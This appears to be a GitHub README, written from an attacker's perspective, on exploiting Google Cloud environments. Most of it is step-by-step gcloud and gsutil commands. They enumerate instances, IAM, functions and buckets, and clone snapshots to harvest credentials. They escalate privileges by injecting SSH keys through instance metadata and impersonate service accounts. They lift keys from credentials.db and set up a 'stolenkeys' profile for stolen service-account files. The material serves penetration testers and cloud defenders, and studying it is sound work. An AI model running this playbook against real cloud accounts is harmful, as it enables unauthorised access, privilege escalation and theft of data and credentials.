# GCP from Attacker's Perspective

The main focus for this repo is, collecting the ways to exploit GCP Environment in one place.

# Scopes

* Storage Bucket
* Compute Instance
* SnapShots
* IAM 
* Databases
* Gcloud Functions (Lambda)

Note we will add more scopes later

Before proceeding further let's just understand some basic flow inside GCP.

When you create a GCP account, this will consider as Organisation. And inside the orgnisation, there are multi projects that you can create. Bydefault, GCP will give a Project-ID.

There are two types of accounts in a Project.

* User Based account 
* Service Based account

User based is like you create a user, and user is using that user's permissions.

Service based account is special type of account which is used by Compute Instances on behalf of you. They always have a .json file which contains the authentication information like below.

```
{
  "type": "service_account",
  "project_id": "Project Name",
  "private_key_id": "xxxx",
  "private_key": "xxxx",
  "client_email": "xxxx",
  "client_id": "xxxx",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",<br>
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/client_email"
}
```

## Access Scope

Access Scopes are the instructions to the compute instance to tell if they are allowed to access the Google cloud APIs or not. 

To retrieve the Access Scopes, you can use this:-

`curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'`

Basically there are three types of Access Scopes.

#### 1. Set Default APIs (Which contains default number of list of Access Scopes)

```
https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write 
https://www.googleapis.com/auth/monitoring.write
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/servicecontrol
```

One of the intersting default perission is `devstorage.read_only`  -- This contains read only on all the storage Objects. (Not Buckets). Something like `gsutils ls gs://bucketname/`. So you need to know the bucket name for that.

#### 2. Access to All Google Cloud APIs

`https://www.googleapis.com/auth/cloud-platform`

This is having the full power on all the APIs, in other words, one can access to any APIs. Take an example of the above, now we can use `gsutils ls` to list out all the buckets.

#### 3. Set Each API for the Access Scope

When you are creating the instance, you can define specifically API scope for that. For ex: If you want to give Compute instance full access to the storage buckets, then you can define this only scope to the particular instance. Then you will get this below scope.

`https://www.googleapis.com/auth/devstorage.full_control`

That means we have full control over the Storage Buckets.


## Understanding How Access Scopes are differ from IAM

**If the compute instances is having cloud-platform scope (that means, full power) but service account is not having any IAM permissions, then the scope is useless (means the service account can't access anything)**.

Access scopes are just only a scopes, they define what scopes are allowed for the compute instance. And IAM is the actual permission defined on the accounts either a User or a Service account.

Or understanding it more specifically, the service account uses IAM permissions, and compute instances uses Scopes. Scopes allows IAM users to get authorise.

Another important thing is :- If you have a very powerfull IAM permissions, for ex: `compute.instanceAdmin` and you only have default scope, the user can't access compute instances, because the instance only have default scope which doesn't contains any compute scopes (As you can see above). 


## So What happens when you create a Compute Instance?

Whenever you want to create an instance , default service account is attached to it, automatically, along the permission attached to that service account, then you can define what access scope you want according to your need, then you can attach the SSH public key with that.

# Exploit GCP Environment

We will break this into two ways

* When we have access INSIDE the console
* When we have access OUTSIDE the console

# When we have access INSIDE the console

You get access inside any compute instance, by using RCE, or through SSH, then you start enumerating it. 

# Compute Instances

* Find the project name and other info:- <br>
`gcloud config list `

* Find all the compute instances<br>
`gcloud compute instances list`

* Find all the subnet list <br>
`gcloud compute networks subnets list`

* Get Detailed Information for any specific instance<br>
`gcloud compute instances describe <instanceName>`


## Compute Instance - Snapshots

Identify the instance running for main application. This might take some time, if there are a lot. 

* List the snapshots<br>
`gcloud compute snapshots list`

This will list all the snapshots, along with the source of instance from which they were created. Now you can simply identify which snapshot is for our targeted instance.

* Now, create the instance from the snapshot<br>
`gcloud compute instances create instance-2 --source-snapshot=snapshot-1 --zone=us-central1-a`

	**Note**:(There might use of other options like subnet, you can use  --subnet, which can be found by describing the instance)

* Now, go to the newly instance, and explore the file system of their main application. (There might be juicy information regarding admin creds, and more).

## Compute Instance - SSH around Project Wide Instances

When you configure your Instance, there is option is available which can block project wide SSH access. You can tick that option to block the SSH at project level. By default, a user can SSH to the other instance inside the same Project by using a single command.

* SSH into the network <br>
`gcloud compute ssh <InstanceName>`

	https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide

## Compute Instances - Firewalls

* List all the firewall rules that are available<br>
`gcloud compute firewall-rules list`

* Describe the rules in detailed <br>
`gcloud compute firewall-rules describe rulename`

Note: This can be used to enumerate the open ports. Try to use automated script `gcp_firewall_enum` script.


# IAM 

Take an above example, there is `set.Metadata` permission which let's you to edit the metadata of the instance. So how can you find this permission so that you would know that you can set Metadata? This is where enumerating IAM permissions comes.

* List all the IAM permission inside the project:<br>
`gcloud projects get-iam-policy xxxxxxxx`

**Note**: This will list all the IAM policies attached to specific member, along with Custom roles. (Roles are nothing but a collection of permissions which can attach to user). Now custom roles generates another question, How can we know what permission are included in Custom Roles? Because when you enumerate, you will see CustomRole23, CustomRole24, etc. Permmission inside those roles are hidden.

* List permissions inside Custom Roles:<br>
`gcloud iam roles list --project=xxxxxxxx`

* Filter user with specific roles (Role that makes you interest)<br>
`gcloud beta asset search-all-iam-policies --query policy:"projects/xxxxxxxx/roles/CustomRole436" --project=xxxxxxxx`

**Note**: There are hundreds of Granular permission which we can enumerate, and according to it we can move forward.


# Privilege Escalation

## Compute Instances - Exploiting SetMetadata 

If the Compromised account is having Compute `instances.setMetadata` IAM permission then the user can escalate his privileges locally.

We will assume that our user is having this permission. And there are multiple instance are running.

So first we will check if any SSH keys are already attached to the metadata(that might be any higher priv user - assuming here).

* Checking if any ssh key is attached to the instance. <br>
	`gcloud compute instances describe instance-1 --zone=us-central1-a --format=json | jq '.metadata.items[].value'` 

	Note: We assumed that there is a `privilegeduser` ssh keys were attached, you will see something like this:-

	`privilegeduser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFGrK8V2k0xBeSzN+oUgnRLSIgUED7ayeUJJ10ryEFR0xJbFeGsRAL5LUzw1DTT9gRKmcMTjmZNU3E99bwyytV0fLnGVRIZ63oC8IdTESR0g8EnU6yam/ntq6gZF5QRcES3gaZlnssOQQhw0rvcCB7o5oM1zCDQtgJXAu/2UI6yKf3xdlcHdrULbKTR+0c7r2FWMLgdghGsA+yH3leHJWjDE/WJ1mqf+ZE+RvwLZ8TmVFJmI37xoKEeVnkmOrOe/TMYvtuzSQduHEUhhfjB8YPUYH7dGHyVPlRp/0Hsrjauf5//zNN9dyAZisElgF7CnJmtJVizfDxlXd/nwrVC8nf2xzbi8nc24STfTg3+lR1f73Z5xN9waPl3eHMNy7nXvShxSO01ZwwuyTmjNh83ik1PJjNU= privilegeduser`

* Copy the Content, and make a new txt file inside your computer and paste the key contents (filename - keys.txt)
* Generate new SSH key with the same exact username that you found above. <br>
	`ssh-keygen -t rsa -C "privilegeduser" -f ./underprivuser`

* Paste the new public key contents into the above txt file below the existing content you pasted above. Something like this:-

	`privilegeduser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFGrK8V2k0xBeSzN+oUgnRLSIgUED7ayeUJJ10ryEFR0xJbFeGsRAL5LUzw1DTT9gRKmcMTjmZNU3E99bwyytV0fLnGVRIZ63oC8IdTESR0g8EnU6yam/ntq6gZF5QRcES3gaZlnssOQQhw0rvcCB7o5oM1zCDQtgJXAu/2UI6yKf3xdlcHdrULbKTR+0c7r2FWMLgdghGsA+yH3leHJWjDE/WJ1mqf+ZE+RvwLZ8TmVFJmI37xoKEeVnkmOrOe/TMYvtuzSQduHEUhhfjB8YPUYH7dGHyVPlRp/0Hsrjauf5//zNN9dyAZisElgF7CnJmtJVizfDxlXd/nwrVC8nf2xzbi8nc24STfTg3+lR1f73Z5xN9waPl3eHMNy7nXvShxSO01ZwwuyTmjNh83ik1PJjNU= privilegeduser`

	`privilegeduser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnLriKvJcwZ2eRUbYpy7ZiZrZub+ZblHgKhATPnRjEXK7Q5U3vOFutCeMavxQ82yIwne6b6LzDAfKeS6wlez1ll2npGhKpb8mAM+ZIKxdTAoAhenOlLlmMyYHhJs/UjkTtj7TZDIEa/uZjZgClK5fmgkYjprsRbPOtAru8fBAOAWfMtrXYFmUJy94iMIvYpRuUPTZ0XUkzmyETNspZOwoOd+K2yTmFor4mWIgTzbaeAtJA+b+nQmXM1Ya1RfalpQsomXnkhqihh/wmqJMDGIJT1YgepMxbj4wy5WyUlE4Ub+/Wh7Lyu51jaRJ++FYh/pgb3m3d8t7B6b2Jj7ldxicQSPu6Mc9TZ5QrPx91dOe/Mzmte2kW7AF8xXo+Se71Ffc5csupUo62uyeXt12F+qNiqHeJXSomxck7rRwonnUhyNJ2icCPogsbDNDjHvdXmGsrXNFU= privilegeduser`

	**Note**: The format for both pub key contents must be matched, otherwise, it will not work.

* Now you have 2 public key file contents into a txt file you created above with the same username `privilegeduser`. Its time to upload it into the metadata of the instance.<br>
`gcloud compute instances add-metadata instance-1 --metadata-from-file ssh-keys=keys.txt --zone us-central1-a`

* Now you can access the instance in the context of `privilegeduser`<br>
` ssh -i underprivuser privilegeduser@xx.xx.xx.xx`

## Service account impersonation

We can run commands in the context of other service account if, `iam.serviceAccountUser` is set on our targetted user as we can find from above IAM enumeration. <br>
`gcloud compute instances list  --impersonate-service-account AccountName` 


## Access Scopes

There might be chances that you compromised a very powerful service account, which is having alot of sensitive permissions but you see that you have restrictive scopes then you can do two things

1. Find other instance having higher scopes
2. Re-authentication the account keys 

#### Access Scopes - Find other instance having higher scopes

* List all the instances<br>
`gcloud compute instances list`

* List all the scopes for other instances, so that we would know which instance is having very high scopes. <br>
`gcloud compute instances describe <InstanceName> --zone=ZoneName --format=json | jq -c '.serviceAccounts[].scopes[]'`

#### Access Scopes - Re-authentication the account keys

Re-authentication the account keys where our gcloud tool is installed, by default it will give `cloud-platform` permissions.

**Note**: In compute instance, the access scope if very restrictive by default, but we are not re-authenticating inside compute instance, we are re-authenticating it let's say, in our computer, where gcloud is installed so that we can get Cloud-Platform permissions.

* First step would be finding the Keys inside the instance:-<br>
`cd /home/<username>/.config/gcloud`<br>
`cat credentials.db`

Copy the credentials, make a new json file inside your computer and paste it.

* Now, re-authenticate the service account:-<br>
`gcloud auth activate-service-account --key-file <file>.json`

* Now you can access the APIs.


# Databases

* List databases<br>
`gcloud sql databases list`

* List Backups <br>
`gcloud sql backups list --instance=test`

If you have permissions to have full access to storage buckets, then you can simply export back-up data to bucket and downloaded it from the bucket. But this requires some roles. 

* roles/cloudsql.client
* roles/storage.legacyBucketWriter

You can check this GCP guide for exporting it.

Reference: https://cloud.google.com/sql/docs/mysql/import-export/exporting

# Google Cloud Functions (Lambda)

* List of the functions<br>
` gcloud functions list`

* Get MORE information: Might contains any Environment Variables<br>
`gcloud functions describe <functionName>`  

* Read function logs:<br>
`gcloud functions logs read <functionName>`

# Other Projects

* List all the other projects<br>
`gcloud projects list`

* Set the projects you found above <br>
`gcloud config set project [Project-Id]` 

**Note**: Here we can start the process again.


# When we are OUTSIDE the Console

Suppose you found .json file (Service account keys)

* Get authentication with those keys - <br>
`gcloud auth activate-service-account --project=<projectid> --key-file=filename.json`<br>

**Note**: Here you need to give project ID which can find it on `.json` file.

* Now check the accout listed as activate account:- <br>
`gcloud auth list`

#### Better Option is creating another profile for that user.

* You can configure another profile as `stolenkeys` for the above user<br>
`gcloud init`

* select `Create a new configuration` <br>

* Give the profile name, let's say<br>
`stolenkeys`

* select the user, user that is found inside the .json file

* You need to enable the the Resource Manger API <br>

* If the project that is found inside the json is listed, then select 1, otherwise select `Create a new project`.

* Either you can use `--configuration=stolenkeys` flags <br>
`gcloud compute instances list --configuration=stolenkeys`

* Or you can activate this accout as default, so that you don't need to speficy that flag again and again:- <br>
`gcloud config configurations activate stolenkeys`

# Storage Buckets

* List all the buckets<br>
`gsutil ls`

* List objects<br>
`gsutil ls -r gs://bucket-name/`

* Cat Object<br>
`gsutil cat gs://bucket-name/anyobject`

* Copy the object into local file system<br>
`gsutil cp gs://bucket-name/anyobject .`


# Enumeration is the Key

If you are not known the specific roles/permission, then you can simply search for the same, and get the idea how we can go forward. The main part was that you have enumerated it. 

# Future Work

Will add more resource into it.

# Feedbacks

Please feel free to provide the improvements, it would be so helpful. I might have done some mistakes which I really want to correct, and learn from it. Also if you like this repo let me know on twitter DM. 

# Contact

[agrawalsmart7](https://twitter.com/agrawalsmart7)


# Reference

(A great blog post to start. Big thanks for this guide.)<br>
https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/#find-service-account-keys <br>
https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum/-/tree/master<br>
https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_enum<br>
https://rhinosecuritylabs.com/assessment-services/gcp-penetration-testing/<br>
https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/PrivEscScanner<br>



























































